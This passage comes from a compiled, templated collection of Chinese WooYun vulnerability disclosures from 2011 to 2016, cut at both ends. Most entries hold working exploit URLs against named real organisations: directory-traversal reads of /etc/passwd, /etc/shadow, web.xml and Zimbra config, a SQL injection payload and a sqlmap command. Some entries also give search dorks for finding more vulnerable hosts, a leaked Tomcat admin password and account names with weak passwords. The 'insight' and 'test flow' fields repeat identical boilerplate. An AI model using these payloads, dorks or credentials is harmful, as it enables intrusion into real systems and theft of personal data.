**POC**: [root@localhost tmp]# curl 117.121.133.42/../../../../../../../../../../../../../../../../../etc/hosts127.0.0.1 localhost www.mogujie.com top.mogujie.com open.mogujie.com upload.mogujie.com shop.mogujie.com ss.mogujie.com baicao.mogujie.com192.168.2.163 juanniu163192.168.2.13 juanniu13192.168.2.24 j

**绕过**: 直接利用

**修复**: 修改配置
---

---
### [wooyun-2015-0136468] 上海研发平台—资源补贴资金专题系统任意文件下载
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: **.**.**.**下载并查看/etc/passwd文件     **.**.**.**/fileDown.do?fileName=../../../../../../../../../../etc/passwd&method=downloadroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/s

**POC**: 如上~

**绕过**: 直接利用

**修复**: 据说可以过滤
---

---
### [wooyun-2014-059516] TRS的WCM某处任意文件读取
**厂商**: TRS | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: web.xml内容被读出

**绕过**: 直接利用

**修复**: 以前你们都出过这种事，参照以前做法，过滤下吧。
---

---
### [wooyun-2016-0188891] p2p金融安全之方正证券某站任意文件读取(可读/etc/shadow)
**厂商**: 方正证券股份有限公司 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://wx.foundersc.com/../../../../../../../../etc/passwd 存在webserver错误配置根目录可导致文件系统遍历

**POC**: 修改插件里面的参数，获取/etc/shadow再读取/etc/hosts看到这里我一度认为我是不是走错了.读取/root/.bash_history发现是nginx的，使用的是node.js有趣的机器人自动回复居然微信的appid跟secret还有效

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0153904] 会鸽任意文件下载导致GITC2015全球互联网大会电子门票任意下载
**厂商**: EventDove | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 下面是我下载的几个别人的，作为提交案例！有电子票好像就可以参会了！哈哈

**POC**: 下面是我下载的几个别人的，作为提交案例！有电子票好像就可以参会了！哈哈

**绕过**: 直接利用

**修复**: 权限控制求rank^^^
---

---
### [wooyun-2014-089274] 华宝证券某平台数据库未授权访问 (泄露用户信息)
**厂商**: 华宝证券 | **年份**: 2014 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 功能测试

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: /* 0 */{"_id" : ObjectId("532da97b3c488e3427000003"),"id" : 1.0,"implFiles" : [{"fileName" : "yinjiang.dll","osType" : "win"}],"schema" : {"name" : "银江行情接口","code" : "yinjiang","vendor" : "itrade","version" : 1.0,"implLogicFiles" : [{"osType" : "win","fileName" : "yinjiang.dll"}]}}114.215.193.50

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-020394] 东北大学某学院网站任意文件下载，反编译导致源码泄露
**厂商**: 东北大学 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 东北大学软件学院网站提供了一个资源下载页面，但是因为对目录的控制不严，导致可以任意下载所有文件，包括WEB-INF下的。

**POC**: 资源下载提供了一个资源下载页面http://sc.neu.edu.cn/jsp/downloadList.jsp?page=1&sec=all下载地址为http://sc.neu.edu.cn/jsp/down.jsp?fname=XXX.DOC但是因为控制不严，导致可以任意下载下载到的class文件，直接用XJAD反编译后得到了Java代码。。

**绕过**: 直接利用

**修复**: 对下载地址验证过滤
---

---
### [wooyun-2015-0144103] 国家电投某系统存在任意文件下载漏洞
**厂商**: 国家电力投资集团公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 国家电力投资集团公司招聘平台http://**.**.**.**/hrjs/问题地址：http://**.**.**.**/hrjs/downloadresume?&filepath=0001AA100000000232OZ.doc构造的时候发现，下面这样可以得到绝对路径http://**.**.**.**/hrjs/downloadresume?filepath=C%3A%5CWindows%5Csystem.ini

**POC**: 所以http://**.**.**.**/hrjs/downloadresume?filepath=../WEB-INF/web.xmlhttp://**.**.**.**/hrjs/downloadresume?filepath=../psnphoto.jsp

**绕过**: 直接利用

**修复**: 过滤../
---

---
### [wooyun-2015-0118393] p2p金融安全之乾贷网目录遍历导致服务器被控制
**厂商**: qiandw.com | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 乾贷网子域名存在一目录遍历，具体漏洞URL如下：http://mobile.qiandw.com/Weily/能够获取到sqlite数据库,地址如下：http://mobile.qiandw.com/Weily/Conf/weily.db如图：下载打开发现几个管理帐号：解密能成功登录他们的缺陷管理平台mantis，如图：接着利用数据库中的用户和密码尝试登录他们的邮箱，成功登录yk@qiandw.com，如图：发现一个平台各种帐号的汇总，有dnspod，阿里云等等，3389服务器，成功登录，如图：数据库都在同一个服务器上，而且该邮箱注册了dnspod和阿里云的，可以密码找回，如图：

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 1，密码管理不要都使用一样的密码；2，目录权限进行严格限制；3，数据库等备份文件不要放在WEB目录~
---

---
### [wooyun-2015-0156290] 小米应用商店安装应用过程可被劫持
**厂商**: 小米科技 | **年份**: 2015 | **类型**: 权限提升

**元思考**: 触发信号: 功能测试

**洞察**: 权限提升防护不足，开发者信任前端输入

**测试流程**:
1. 识别权限提升相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 小米应用商店在小米手机上是预装应用。小米应用商店在安装应用过程中，首先会将APK文件下载到/sdcard/MiMarket/files/目录下。恶意应用只要具有读写SD卡的权限，就可以在APK下载完成后，程序安装前替换APK文件。尽管从APK下载完成到调用系统API来安装应用的时间非常短暂，但攻击者（一个恶意应用）仍然可以检测并利用。恶意应用可以监控该目录并判断APK文件是否下载成功，然后替换APK文件。只要/sdcard/MiMarket/files/目录出现了以.apk结尾的文件，就代表APK下载成功。因为是预装应用，小米应用商店应用市场可静默安装应用。利用该漏洞，攻击者（一个恶意应用）可以替换原有待安装应用而静默安装恶意或者重打包应用。例如，用户原本希望安装微信，但实际上安装的是具有密码记录的重打包微信。因此，从小米应用商店安装的任意应用都不可信。

**POC**: demo:在3.03上测试http://**.**.**.**/v_show/id_XMTM5NjkzOTczNg==.html密码：sechm2

**绕过**: 直接利用

**修复**: 修复方式是下载apk至应用的内部目录下，然后将apk设置成全局可读后再安装。
---

---
### [wooyun-2015-0103534] 通管局某站点任意文件下载
**厂商**: 青海通信管理局 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 通管局某站点任意文件下载www.qhca.gov.cn:80/QHCMS/getfileservlet?path=../../../../../../../../../../../.././windows/win.ini%00.html

**POC**: 见上

**绕过**: 直接利用

**修复**: 正则 过滤 限制并限制访问文件类型
---

---
### [wooyun-2015-0147509] 淑女屋OA大量弱口令（有董事长信息）（lotus-domino）（Fuzz大法）
**厂商**: 淑女屋 | **年份**: 2015 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 认证接口

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: OA接口：http://211.162.66.44/我先用人口top500密码a fuzz结果如下我李军的密码改成2429946577了，因为他提示第一次登录要改密码。但是李军的权限太低了，打开自动退出，于是找到通讯录（登录后访问）。http://211.162.66.44/oanames.nsf/weboa/webpage.nsf/cpassword?OpenForm/weboa/zongbuweboa/guanlanweboa/huananyiquweboa/huananerweboa/huazhongweboa/huazhongerweboa/huabeiyiweboa/huabeierweboa/huadongweboa/dongbeiyiweboa/dongbeierweboa/wuhanxinriweboa/xinanyiweboa/xinanerweboa/xibeiwebo

**POC**: 对用户表的用户进行fuzz密码还是0结果发现密码为0的用户有管理员1供应链中心自然元素官方旗舰自然元素韩飞吴菊娥陈明英郭福历苑严超许笃源王磊2黄玲玲1段纪华陈强刘媛媛杨芬柳虎城柳虎城1张艳志黄文红陈超平王云兰1吴翠红黄燕华刘小兰李爱国1王莹莹2徐芳玲1周志梅朱带娣王万兰1黄美伦王英2陈万香1程莹1陈小林1周美艳韩凤青1黄华柱陈理慈1张高慧吴少林郑斌园何文莲蹇桂兰王香碧张建华张水成单成玉孙晓丹李婷婷1王娟吴玉屏林奕媚钟丽如深圳美乐人人乐床深圳芮欧床朱杏花黄色游卢文爽康四香蔡丽玲陈东莞林映珠林丽芳王燕月陈旭娜袁宝云彭珍吴锦梅杨颖诗林婷婷柯少婷庄舜铃傅楚虹林妹-华强茂业自然元素温文雅李虹励1张茹程燕

**绕过**: 直接利用

**修复**: 通知用户改密码
---

---
### [wooyun-2012-07281] 人民网某分站文件包含导致任意文件读取
**厂商**: 人民网 | **年份**: 2012 | **类型**: 文件包含

**元思考**: 触发信号: 功能测试

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://data.sports.people.com.cn/public/football_bang.php?p_id=../../../../../../../../../../etc/passwd%00.jpg

**POC**: http://data.sports.people.com.cn/public/football_bang.php?p_id=../../../../../../../../../../etc/passwd%00.jpg

**绕过**: 直接利用

**修复**: 过滤吧,最后说下,去年乌云上提交的注入点,今年居然还存在,太霸气了
---

---
### [wooyun-2014-061174] 中国电信某站SQL注射+任意文件读取漏洞
**厂商**: 中国电信 | **年份**: 2014 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 参数注入

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 号码百事通车友圈 http://auto.118114.cn/从新注册用户的UID可以推断出该站约有5W多会员。在 http://auto.118114.cn/entry 注册页面选择"企业用户注册"，选择一个省份后抓取到一条HTTP请求:http://auto.118114.cn/block/loginact?act=get_areas&pcode=110000&registercateg=1&v=37其中, pcode参数存在SQL注射。

**POC**: sqlmap.py -u "http://auto.118114.cn/block/loginact?act=get_areas&pcode=110000&registercateg=1&v=37" --dbs --current-user --current-dbsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: pcodeType: UNION queryTitle: MySQL UNION query (NULL) - 5 c

**绕过**: 直接利用

**修复**: 电信更专业:)
---

---
### [wooyun-2014-052124] Ecmall某处SQL注射漏洞
**厂商**: ShopEx | **年份**: 2014 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 功能测试

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 缺陷文件：/app/my_goods.app.phpfunction brand_list(){if (!empty($_GET['brand_name']) || !empty($_GET['store'])){$_GET['brand_name'] && $filtered = " AND brand_name LIKE '%{$_GET['brand_name']}%'";$_GET['store'] && $filtered = $filtered . " AND store_id = " . $this->_store_id;}if (isset($_GET['sort']) && isset($_GET['order'])){$sort  = strtolower(trim($_GET['sort']));  //未过滤$order = strtolower(trim($_GE

**POC**: 利用方法：注册会员开一个店铺访问：index.php?app=my_goods&act=brand_list&order=asc&sort=1 and (select user_name from ecm_member where user_id=1 union select 1 from (select count(*),concat(floor(rand(0)*2),(select concat(user_name,password) from ecm_member limit 0,1))a from information_schema.tables group by a)b)%23即可

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2015-089879] Hudson最新版本任意文件读取
**厂商**: eclipse.org | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: DirectoryBrowserSupport.class中可以看到，String pattern = req.getParameter("pattern");if (pattern == null) {pattern = req.getParameter("path");}if (pattern != null) {rsp.sendRedirect2(pattern);return;}String path = getPath(req);if (path.replace('\\', '/').indexOf("/../") != -1){rsp.sendError(400);return;}程序只对/../开头的参数pattern进行过滤，所以测试一下http://127.0.0.1:8080/job/msearch-trunk/lastSuccessfulBuild/artifact/

**POC**: 如图：

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2013-027977] 临沂市环境保护局存在漏洞可导致网站被渗透
**厂商**: 临沂市环境保护局 | **年份**: 2013 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.lyhb.gov.cn/a.rarhttp://www.lyhb.gov.cn/plus/http://www.lyhb.gov.cn/webadmin/

**POC**: 同时附加一些疑被修改信息的政府网站：http://www.jlqdw.gov.cn/xk.htmlhttp://www.tongjiang.gov.cn/v/styles/default/lib/kindeditor-4.0.5/attached/file/20121221/20121221083443_62481.htmlhttp://www.cenxidj.gov.cn/dimag/plus/view.php?aid=1884&tid=147http://www.whep.gov.cn/text.php?artid=7241&PHPSESSID=6b0608d0f7c7b3911e5d6a

**绕过**: 直接利用

**修复**: 删除备份文件，修改数据库密码。
---

---
### [wooyun-2014-050102] iwebshop通用后台管理员权限任意文件下载
**厂商**: iwebshop | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入, 后台管理

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: exp:index.php?controller=tools&action=download&file=../../index.php未对file参数严格控制导致任意文件下载鸡肋之处在于需要后台权限

**POC**: 登录后台后访问http://127.0.0.1/iwebshop/index.php?controller=tools&action=download&file=../../index.php

**绕过**: 直接利用

**修复**: 对file参数进行限制，不允许出现点
---

---
### [wooyun-2013-045443] 某商品交易所邮件系统任意文件读取漏洞可导致敏感信息泄漏
**厂商**: 某商品交易所 | **年份**: 2013 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 以下内容摘自：猪猪侠2013年12月6日，exploit-db披露了一个Zimbra邮件服务端的本地文件包含漏洞，可读取邮件服务器上的任意文件，通过获取到的LDAP信息，即可得到所有用户的密码HASH散列。用户密码采用OpenLADP SHA算法，通过GPU运算即可暴力破解，该漏洞将为企业或机构带来非常严重的数据泄露风险。攻击者还可以通过邮箱内的信息收集保护不足的数据，利用收集到的信息对系统实施进一步的攻击。Zimbra - 0day exploit / Privilegie escalation via LFIhttp://www.exploit-db.com/exploits/30085/

**POC**: 地址：http://mail.chinatme.com/exp：http://mail.chinatme.com/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../opt/zimbra/conf/localconfig.xml%00

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-08517] 某省发改委门户网站任意文件下载
**厂商**: 某省发改委 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 原始链接：http://test.ahpc.gov.cn/front/info/information_download.jsp?FileName=100232012576180.pdf&name=%B9%D8%D3%DA%BE%AF%CC%E8%BC%D9%C3%B0%CA%A1%B7%A2%D5%B9%B8%C4%B8%EF%CE%AF%C3%FB%D2%E5%BD%F8%D0%D0%D5%A9%C6%AD%B5%C4%CD%A8%D6%AA.pdf其中文件下载路径参数filename没有对路径进行必要的限制！

**POC**: http://test.ahpc.gov.cn/front/info/information_download.jsp?FileName=../../front/info/information_download.jsp&name=information_download.jsphttp://test.ahpc.gov.cn/front/info/information_download.jsp?FileName=../../index.jsp&name=index.jsp

**绕过**: 直接利用

**修复**: 对下载路径做必要的限制！
---

---
### [wooyun-2014-087232] 和讯网旗下某站敏感信息泄露
**厂商**: 和讯网 | **年份**: 2014 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 主办单位名称	北京和讯在线信息咨询服务有限公司主办单位性质	企业网站备案/许可证号	京ICP备10021077号-8网站名称	理财客网站首页网址	www.licaike.comhttp://img.dai.licaike.com/目录遍历，每个目录下都是身份证，工商营业执照的图片，虽然打了码，还是有部分信息泄露

**POC**: 以上

**绕过**: 直接利用

**修复**: 你懂
---

---
### [wooyun-2014-058875] 联志软件某通用型cms任意文件下载
**厂商**: 联志软件 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 特征：getFile.jsp，是联志软件 开发的。很多高校在用。以http://lab.tjmu.edu.cn/lab/getFile.jsp 为例，http://lab.tjmu.edu.cn/lab/getFile.jsp?filename=../../index.jsp下载首页文件http://lab.tjmu.edu.cn/lab/getFile.jsp?filename=../../getFile.jsp 下载getFile.jsp回来看看。getRealPath("/news/UploadFile/"+filename)filename 没有做控制，导致用户可控形成文件下载。实例2：http://zjc.wtu.edu.cn/getFile.jsp?filename=../../getFile.jsp在首页都可以看到是联志软件的标识：

**POC**: inurl:getFile.jsp site:edu.cn能找到不少例子，这套系统的特征就是footer有联志软件的标识，上面已经给出了。

**绕过**: 直接利用

**修复**: filename不要让用户可控了啊。
---

---
### [wooyun-2012-013694] 快乐购一处任意文件下载，泄露数据库连接用户和密码
**厂商**: 快乐购物股份有限公司 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 通过上图可以看到下载的文件，如图如下，这是phpstat的漏洞这就是数据库的配置文件了啦

**POC**: 通过上图可以看到下载的文件，如图如下，这是phpstat的漏洞这就是数据库的配置文件了啦

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-065435] 某地区行政服务中心任意文件下载
**厂商**: gov.cn | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.dxalxzfwzx.gov.cn/home/do_download.jsp?url=../../conf/tomcat-users.xml<?xml version='1.0' encoding='utf-8'?><tomcat-users><role rolename="manager"/><role rolename="admin"/><user username="admin" password="dxal" roles="admin,manager"/></tomcat-users>http://www.dxalxzfwzx.gov.cn/home/do_download.jsp?url=/home/do_download.jsp<%@ page contentType="text/html; charset=gb2312" language="java" 

**POC**: 如上，可获得tomcat密码

**绕过**: 直接利用

**修复**: 限制下载权限，下载后缀名白名单
---

---
### [wooyun-2014-065919] 华天动力OA任意文件下载漏洞（两处）
**厂商**: oa8000.com | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 通用漏洞，以http://demo.oa8000.com为例。1.首先必须先访问http://demo.oa8000.com2.[第一处]访问 http://demo.oa8000.com/OAapp/jsp/download.jsp?filename=boot.ini&filePath=C%3A%2Fboot.ini&noDecode=1即可下载C:\boot.inifilename为目标文件名，filePath为目标文件绝对地址[第二处]这次是downloadClient.jsp http://demo.oa8000.com/OAapp/jsp/downloadClient.jsp?filename=boot.ini&filePath=C%3A%2Fboot.ini&noDecode=1即可下载C:\boot.inifilename为目标文件名 filePath为目标文件绝对地址

**POC**: 再次强调，必须先访问http://demo.oa8000.com

**绕过**: 直接利用

**修复**: you know
---

---
### [wooyun-2013-020094] 东风标致3008官网任意文件下载,导致源码被读取
**厂商**: 东风标致汽车有限公司 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 由于最近考驾照，所以对SUV车子比较观注，喜欢上了东风标致3008就去官方看了一下，发现存在任意文件下载漏洞，再配置上phpinfo的信息可以实现tomcat等敏感信息的读取。1、http://3008.dongfengpeugeot.com.cn/download_con.shtml#1 下载壁纸发现下载中的URL地址可自定义。

**POC**: 2、http://3008.dongfengpeugeot.com.cn/downpic.php?pic=downpic.php3、http://www.dongfengpeugeot.com.cn/test.php phpinfo信息泄露4、http://3008.dongfengpeugeot.com.cn/downpic.php?pic=C:\PHP_Setup_for_IIS\PHP5\php.ini   php.ini信息泄露5、物理路径泄露 http://3008.dongfengpeugeot.com.cn/downpic.php?pic=xxx其它的我就不截图了，比较严重。

**绕过**: 直接利用

**修复**: 1、对下载路径进行过滤，去掉../或者..\，限制可访问路径及过滤文件后缀名2、前台使用纯静态3、使用安全狗或者硬件WAF防御。4、建议定期做web渗透测试
---

---
### [wooyun-2014-060360] 圆通某站点任意文件下载导致信息泄漏
**厂商**: 圆通 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://mail.yto.net.cn/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../opt/zimbra/conf/localconfig.xml%00

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 升级zimbra
---

---
### [wooyun-2015-0121332] 金智教育门户信息系统存在任意文件读取
**厂商**: 金智教育门户 | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 金智教育门户信息任意文件读取漏洞文件：/epstar/servlet/RaqFileServer?action=open&fileName=案例：http://rs.tongji.edu.cn/epstar/servlet/RaqFileServer?action=open&fileName=/../WEB-INF/web.xmlhttp://yjs.njau.edu.cn/epstar/servlet/RaqFileServer?action=open&fileName=/../WEB-INF/web.xmlhttp://ssgl.whu.edu.cn//epstar/servlet/RaqFileServer?action=open&fileName=/../WEB-INF/web.xmlhttp://www.urp.fudan.edu.cn:86/epstar/servlet/Raq

**POC**: 1#http://rs.tongji.edu.cn/epstar/servlet/RaqFileServer?action=open&fileName=/../WEB-INF/web.xml2#http://yjs.njau.edu.cn/epstar/servlet/RaqFileServer?action=open&fileName=/../WEB-INF/web.xml3#http://ssgl.whu.edu.cn//epstar/servlet/RaqFileServer?action=open&fileName=/../WEB-INF/web.xml

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2014-066725] ZXV10-W815路由设置文件未授权访问
**厂商**: 中兴通讯股份有限公司 | **年份**: 2014 | **类型**: 非授权访问

**元思考**: 触发信号: 功能测试

**洞察**: 非授权访问防护不足，开发者信任前端输入

**测试流程**:
1. 识别非授权访问相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 日志文件http://地址/getpage.gch?pid=1002&nextpage=manager_log_conf_t.gch点击“下载日志”即可下载日志用户配置文件下载http://地址/getpage.gch?pid=1002&nextpage=manager_dev_config_t.gch设备配置文件下载http://地址/getpage.gch?pid=1002&nextpage=manager_dev_defcfg_t.gch案例：http://27.37.53.126/getpage.gch?pid=1002&nextpage=manager_dev_defcfg_t.gch

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 添加权限
---

---
### [wooyun-2015-0134120] 某大型Learning Management System任意文件下载漏洞
**厂商**: 北京尖峰合讯科技有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 厂商目测是：http://**.**.**.**/portal/jsp/index.jsp  北京尖峰合讯科技有限公司产品：在线培训管理系统（Learning Management System）案例都是很厉害的。涉及大量政府、任意文件下载漏洞：/jsp/common/download.jsp?filepath=/./.././.././.././.././.././.././.././../etc/passwd关键字实在不好找，只能给点案例了：mask 区域1.http://**.**.**/jsp/common/download.jspfilepath=/./../.././../../../../../etc/passwd  国家食品药品安全专业技术人员培训网_2.http://**.**.**/jsp/common/download.jsp  filepath=/./../../.

**POC**: Secucity Testing:1、2、也可以读shadow

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0150077] 金蝶协同办公系统存在通用型任意文件下载漏洞
**厂商**: 金蝶 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 上传功能

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 前人漏洞参见http://**.**.**.**/bugs/wooyun-2015-0129923关键字： inurl:/themes/mskin/login/ inurl://mskin/login/发现的过程如下，使用components/fck/editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/simpleuploader上传文件，返回值里带了一个链接window.parent.OnUploadCompleted(0,'../../fileDownload.do?type=File&path=/uploadfiles/File/2015103011112167752481.jpg','2015103011112167752481.jpg','');

**POC**: **.**.**.**:7890/oa/fileDownload.do?type=File&path=/../webapp/WEB-INF/web.xmlhttp://**.**.**.**:7890/oa/fileDownload.do?type=File&path=/../webapp/WEB-INF/web.xml以上是金蝶的演示系统下面上几个客户系统http://**.**.**.**/oa/fileDownload.do?type=File&path=/../webapp/WEB-INF/web.xmlhttp://**.**.**.**:7890/oa/fileDownload.d

**绕过**: 直接利用

**修复**: 过滤../
---

---
### [wooyun-2011-03185] PhpMyadmin任意文件读取漏洞
**厂商**: PhpMyadmin | **年份**: 2011 | **类型**: 默认配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 默认配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别默认配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: libraries/import/xml.php中unset($data);/*** Load the XML string** The option LIBXML_COMPACT is specified because it can* result in increased performance without the need to* alter the code in any way. It's basically a freebee.*/$xml = simplexml_load_string($buffer, "SimpleXMLElement", LIBXML_COMPACT);unset($buffer);/*** The XML was malformed*/if ($xml === FALSE) {可以使用系统中的import功能导入一个精心构造的xml文件<?xml

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 换其他操作xml的方式，譬如xml_parse
---

---
### [wooyun-2015-0163326] 泛华保网某处目录遍历/下载(泄露大量公司内部信息及私人照片)
**厂商**: 泛华保网 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.baoxian.comhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们更专业！！！
---

---
### [wooyun-2014-061406] 公积金查询网站存在目录遍历备份文件可下载
